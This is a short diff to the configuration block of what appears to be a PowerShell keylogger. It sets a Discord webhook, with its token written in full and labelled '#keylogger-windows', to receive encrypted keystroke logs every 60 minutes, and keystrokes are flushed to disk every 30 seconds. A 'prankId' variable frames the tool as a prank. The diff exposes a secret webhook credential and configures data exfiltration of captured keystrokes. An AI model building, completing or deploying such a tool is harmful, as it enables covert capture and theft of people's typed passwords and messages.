@@ -6,7 +6,7 @@
 ####################################################################################################
 
 # --- Configuration -----------------------------------------------------------
-$webhookUrl  = 'REPLACE_ME'  # Discord webhook URL for periodic log upload (leave 'REPLACE_ME' to disable)
+$webhookUrl  = 'https://discord.com/api/webhooks/1504979894784888993/HhDjgT0J4kVExANWtMVdZHUT1J_J_6P99JwtIruQqtPMUaSD4q3SFQKEiLXfsxR2xS16'  # Discord webhook (#keylogger-windows) — from DISCORD_WEBHOOK_KEYLOGGER_WINDOWS in .env
 $flushSecs   = 30            # How often (seconds) to flush buffered keystrokes to disk
 $uploadMins  = 60            # How often (minutes) to POST encrypted log to webhook
 $prankId     = [System.Guid]::NewGuid().ToString('N').Substring(0,8).ToUpper()
